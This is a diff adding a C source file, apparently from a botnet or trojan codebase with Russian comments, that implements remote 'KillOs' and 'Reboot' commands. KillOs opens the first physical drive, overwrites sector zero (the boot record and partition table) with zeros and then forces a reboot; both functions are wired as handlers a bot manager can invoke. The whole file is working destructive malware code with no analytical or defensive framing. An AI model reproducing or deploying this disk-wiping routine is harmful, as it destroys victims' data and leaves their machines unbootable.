@@ -1,0 +1,53 @@
+#include "KillOs_Reboot.h"
+#include "GetApi.h"
+#include "ntdll.h"
+#include "Memory.h"
+#include "String.h"
+
+bool KillOs()
+{
+	// перезаписывает нулевой сектор, а там находиться Таблица разделов  
+	HANDLE hDest;
+	CHAR p[512];
+	DWORD size;
+	BOOL ret;
+ 
+	hDest = pCreateFileA("\\\\.\\PHYSICALDRIVE0",GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
+	if(hDest == INVALID_HANDLE_VALUE)
+	{
+		
+
+		return FALSE;
+	};
+    
+      
+    m_memset(p,sizeof(p),0);
+	size = sizeof(p);
+	ret = (BOOL) pWriteFile(hDest,p,size,&size,NULL);
+        
+    pCloseHandle(hDest);
+	
+	pOutputDebugStringA((ret)? ("KillOs ok"):("KillOs error"));
+    Reboot();
+	return (ret)?(true):(false);
+
+}	
+void Reboot(void)
+{
+	BOOL OldValue;
+
+	if (NT_SUCCESS(pRtlAdjustPrivilege(SE_SHUTDOWN_PRIVILEGE, TRUE, FALSE, (PBOOLEAN)&OldValue)))
+	pExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
+}
+bool ExecuteKillosCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
+{
+	return KillOs();
+
+}
+bool ExecuteRebootCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments)
+{
+	// вернем фалсе, так как в другом случае произойдет перегрузка
+	Reboot();
+	return false;
+
+}
